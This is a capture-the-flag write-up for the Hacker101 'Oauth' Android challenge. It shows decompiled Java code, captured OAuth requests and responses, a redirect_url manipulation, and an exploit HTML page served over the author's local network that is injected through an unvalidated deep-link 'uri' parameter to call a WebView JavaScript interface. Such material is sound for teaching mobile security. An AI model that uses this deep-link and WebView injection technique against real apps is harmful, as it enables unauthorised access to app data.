![[oauth1.png]]
**Difficulty:** Moderate
**Skills:** Android
**Flags:** 2

---

## Flag 1/2
The first thing that we need to do is download the **.APK** file and decompile with **apktool** 
```bash
apktool d oauth.apk
```

And for recon, I’ll run **MobSF** and **jadx-gui**
The **target SDK** is **28**, then I will use my **Android 9.0** with _Genymotion_.
Install the **.APK** with

```bash
adb install oauth.apk
```
![[oauth2.png]]

When we click on the button, this piece of code is executed:
_NOTE: URL is my private instance._

```java
public void onClick(View view) {
    if (view.getId() != R.id.button) {
        return;
    }
    String str = null;
    try {
        str = "https://URL.ctf.hacker101.com/oauth?redirect_url=" + URLEncoder.encode(this.authRedirectUri, StandardCharsets.UTF_8.toString()) + "login&response_type=token&scope=all";
    } catch (UnsupportedEncodingException e) {
        e.printStackTrace();
    }
    Intent intent = new Intent("android.intent.action.VIEW");
    intent.setData(Uri.parse(str));
    startActivity(intent);
}
```

In **burpsuite**, we can capture this **request**:
```bash
GET /oauth?redirect_url=oauth://final/login&response_type=token&scope=all HTTP/2
Host: URL.ctf.hacker101.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 9; Pixel Build/PI; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.186 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
X-Requested-With: org.chromium.webview_shell
```

The **response** is:
```bash
HTTP/2 200 OK
Date: Wed, 03 Apr 2024 09:14:47 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 101
Server: openresty/1.25.3.1

<a href="oauth://final/login?token=3e9c275b75929032141f0d0775ca53e8">Authorize Mobile Application</a>
```

_For every request, we get a new token_.
And click on the **Authorize Mobile Application**
Then, we are redirect to the App.
![[oauth3.png]]

Looking at the **Browser.java** source code, in this piece:
```java
public void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    setContentView(R.layout.activity_browser);
    String str = "https://URL.ctf.hacker101.com/authed";
    try {
        Uri data = getIntent().getData();
        if (data != null && data.getQueryParameter("uri") != null) {
            str = data.getQueryParameter("uri");
        }
    } catch (Exception unused) {
    }
    WebView webView = (WebView) findViewById(R.id.webview);
    webView.setWebViewClient(new SSLTolerentWebViewClient(webView));
    webView.getSettings().setJavaScriptEnabled(true);
    webView.addJavascriptInterface(new WebAppInterface(getApplicationContext()), "iface");
    webView.loadUrl(str);
}
```

I noticed that there are an endpoint (**/authed**).
Then, I tried change the request of above
```bash
GET /oauth?redirect_url=oauth://final/login&response_type=token&scope=all HTTP/2
Host: URL.ctf.hacker101.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 9; Pixel Build/PI; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.186 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
X-Requested-With: org.chromium.webview_shell
```

To:
```bash
GET /oauth?redirect_url=authed HTTP/2
Host: URL.ctf.hacker101.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 9; Pixel Build/PI; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.186 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
X-Requested-With: org.chromium.webview_shell
```

And we get the flag in the response:
```bash
HTTP/2 200 OK
Date: Wed, 03 Apr 2024 09:18:41 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 132
Server: openresty/1.25.3.1

<a href="authed?token=^FLAG^6a635d3784aeca7***********************f67a72a3b2$FLAG$">Authorize Mobile Application</a>
```
This is because when we click on **Authorize Mobile Application**, behind scene the “_token flag_” is generated, in the activity without content.

## Flag 2/2
Looking the source code, I noticed that **WebAppInterface.java** have **getFlagPath()**
Where an **url** is crafted with _some randoms numbers_.
And at _the end_, we can see that **finalize** in **.html**
And looking in the **Browser.java** we can see:
```java
try {
        Uri data = getIntent().getData();
        if (data != null && data.getQueryParameter("uri") != null) {
            str = data.getQueryParameter("uri");
        }
    } catch (Exception unused) {
    }
    WebView webView = (WebView) findViewById(R.id.webview);
    webView.setWebViewClient(new SSLTolerentWebViewClient(webView));
    webView.getSettings().setJavaScriptEnabled(true);
    webView.addJavascriptInterface(new WebAppInterface(getApplicationContext()), "iface");
    webView.loadUrl(str);
}
```

Then, we need call the param “**uri**” with **JavaScript** code hosted by our own, calling the **WebApp** know as **iface**.
This code can clarify this:
```HTML
<html>
  <head>
  </head>
  <body>
    <h1>Test</h1>
    <p id="msg">Test</p>
    <script type="text/javascript">
      var msg = document.getElementById("msg");
      msg.innerHTML = iface.getFlagPath();
    </script>
  </body>
</html>
```

So, with a simple Python server we can just:
```bash
python3 -m http.server 8081
```

Then with **adb** we can call the **URL** with:
```bash
oauth://final/?uri=<ourHostedHTMLfile>
```

This is the command:
```bash
adb shell am start -a android.intent.action.VIEW -d "oauth://final/?uri=http://192.168.1.4:8081/expl.html" com.hacker101.oauth
```


Letme explain the command ^^

**adb shell am start**
This command is used to start an activity on the Android device.

**-a android.intent.action.VIEW**
Specifies the action to be performed, in this case, opening a view.

**-d “oauth://final/?uri=http://192.168.1.4:8081/expl.html”**
This indicates the URI to which the action will be directed. In this case, it looks like you are trying to open a link pointing to “[http://192.168.1.4:8081/expl.html](http://192.168.1.4:8081/expl.html)” with a scheme of “oauth://final/”.

**com.hacker101.oauth**
This is the name of the application package to which this intent will be sent.

So, _executing this command_, we’ll launch the app and a new **.html** file will appear.
![[oauth4.png]]

Copy, paste and **get the flag**.

I hope you found it useful (: